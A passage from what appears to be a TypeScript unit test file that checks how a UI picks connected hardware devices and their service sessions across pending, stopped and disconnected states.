    expect(resolved.run).toBe(run);
    expect(phaseLabel(resolved.run)).toBe('Needs confirmation');
    run.session.serviceId = serviceIdFor('dd');
    expect(resolveServiceSelection(devices, { [run.serviceId]: run }, selected).device?.path_hex).toBe('dd');
  });
  it('normalizes nonempty serial whitespace and never changes an explicit idle choice', () => {
    const run = activeDial();
    run.session = { ...run.session!, serialNumber: ' S1 ', serviceId: null, phase: 'waiting_for_device' };
    expect(resolveServiceSelection([{ ...dial, path_hex: 'cc' }], { [run.serviceId]: run }, { device: dial, sessionId: run.serviceId }).device?.path_hex).toBe('cc');
    expect(resolveServiceSelection([dial, knobs], { [run.serviceId]: run }, { device: knobs }).run).toBeUndefined();
  });
  it('recovers a sole active session on remount even when knobs are listed first', () => {
    const run = activeDial();
    const resolved = resolveServiceSelection([knobs, dial], { [run.serviceId]: run }, null);
    expect(resolved.device).toEqual(dial);
    expect(resolved.selection?.sessionId).toBe(run.serviceId);
    const { feed, runner } = fixtures(false);
    (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [knobs] };
    run.session = { ...run.session!, serviceId: null, phase: 'waiting_for_device' };
    (runner as unknown as { state: unknown }).state = { ...runner.getState(), runs: { [run.serviceId]: run } };
    const markup = render({ feed, runner });
    expect(markup).toContain('>Waiting<');
    expect(markup).toContain('(disconnected)');
    expect(markup).toContain('>Stop<');
    expect(markup).toContain('Everyday');
  });
  it('adopts a new active session after the retained session stopped', () => {
    const ended = activeDial();
    ended.session = { ...ended.session!, phase: 'stopped', serviceId: null };
    const next = { ...activeDial(), serviceId: 'session:new' };
    const selected = { device: dial, sessionId: ended.serviceId };
    expect(resolveServiceSelection([dial], { [ended.serviceId]: ended }, selected).run).toBe(ended);
    const resolved = resolveServiceSelection([dial], { [ended.serviceId]: ended, [next.serviceId]: next }, selected);
    expect(resolved.run).toBe(next);
    expect(resolved.selection?.sessionId).toBe(next.serviceId);
  });

  it('prefers a new pending run over stopped history before its first session event, even after removal', () => {
    const ended = activeDial();
    ended.session = { ...ended.session!, phase: 'stopped', serviceId: null };
    const pending: ServiceRun = { ...activeDial(), session: undefined, serviceId: 'pending:service:cc', processId: serviceIdFor('cc'),
      state: 'starting', startedOn: { module: 'm131e', serialNumber: 'S1' } };
    const selected = { device: dial, sessionId: ended.serviceId };
    const runs = { [ended.serviceId]: ended, [pending.serviceId]: pending };
    const resolved = resolveServiceSelection([{ ...dial, path_hex: 'cc' }], runs, selected);
    expect(resolved.run).toBe(pending);
    expect(phaseLabel(resolved.run)).toBe('Starting');
    expect(resolved.selection?.sessionId).toBe(pending.serviceId);
    expect(resolveServiceSelection([knobs], runs, selected).run).toBe(pending);
    expect(resolveServiceSelection([knobs], runs, resolved.selection).run).toBe(pending);
  });
  it('retains explicitly selected stopped history over an older session on the same identity', () => {
    const older = activeDial();
    older.session = { ...older.session!, phase: 'stopped', serviceId: null };
    const newer: ServiceRun = { ...older, serviceId: 'session:newer' };
    const runs = { [older.serviceId]: older, [newer.serviceId]: newer };
    const resolved = resolveServiceSelection([dial], runs, { device: dial, sessionId: newer.serviceId });
    expect(resolved.run).toBe(newer);
    expect(resolved.selection?.sessionId).toBe(newer.serviceId);
  });
  it('uses a distinct disconnected value when a replacement reuses the old path', () => {
    const run = activeDial();
    run.session = { ...run.session!, serviceId: null, phase: 'waiting_for_device' };
    const replacement = { ...dial, serial_number: 'S2' };
    const { feed, runner } = fixtures(false);
    (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [replacement] };
    (runner as unknown as { state: unknown }).state = { ...runner.getState(), runs: { [run.serviceId]: run } };
    const markup = render({ feed, runner });
    expect(markup).toContain(`<option value="${disconnectedServiceValue}" selected="">`);
    expect(markup).toContain(`<option value="${dial.path_hex}">`);
    expect(resolveServiceSelection([replacement], { [run.serviceId]: run }, { device: replacement }).device).toBe(replacement);
    expect(resolveServiceSelection([replacement], { [run.serviceId]: run }, { device: replacement }).run).toBeUndefined();
  });

  it('follows a serial-less pending run adopted after removal, including a renamed session', () => {
    const selectedDevice = { ...dial, serial_number: null };
    const pending: ServiceRun = { ...activeDial(), session: undefined, serviceId: 'pending:service:aabb',
      processId: serviceIdFor(dial.path_hex), state: 'starting', startedOn: { module: 'm131e', serialNumber: null } };
    const started = resolveServiceSelection([selectedDevice], { [pending.serviceId]: pending }, { device: selectedDevice });
    const removed = resolveServiceSelection([knobs], { [pending.serviceId]: pending }, started.selection);
    expect(removed.run).toBe(pending);
    for (const id of [serviceIdFor(dial.path_hex), 'session:renamed']) {
      const adopted: ServiceRun = { ...activeDial(), serviceId: id,
        session: { ...activeDial().session!, serialNumber: null, serviceId: null, phase: 'waiting_for_device' } };
      const resolved = resolveServiceSelection([knobs], { [adopted.serviceId]: adopted }, removed.selection);
      expect(resolved.run).toBe(adopted);
      expect(phaseLabel(resolved.run)).toBe('Waiting');
      expect(resolved.selection?.sessionId).toBe(id);
      expect(resolved.device).toBeUndefined();
    }
  });
  it('does not guess a serial-less adoption among several sessions or adopt a nonempty serial', () => {
    const first: ServiceRun = { ...activeDial(), serviceId: 'session:first',
      session: { ...activeDial().session!, serialNumber: null, serviceId: null, phase: 'waiting_for_device' } };
    const second: ServiceRun = { ...first, serviceId: 'session:second' };
    const chosen = { device: { ...dial, serial_number: null }, sessionId: 'pending:service:aabb' };
    expect(resolveServiceSelection([knobs], { [first.serviceId]: first, [second.serviceId]: second }, chosen).run).toBeUndefined();
    const named: ServiceRun = { ...first, session: { ...first.session!, serialNumber: 'S2' } };
    expect(resolveServiceSelection([knobs], { [named.serviceId]: named }, chosen).run).toBeUndefined();
    const original: ServiceRun = { ...first, serviceId: serviceIdFor(dial.path_hex) };
    expect(resolveServiceSelection([knobs], { [second.serviceId]: second, [original.serviceId]: original }, chosen).run).toBe(original);
  });

});
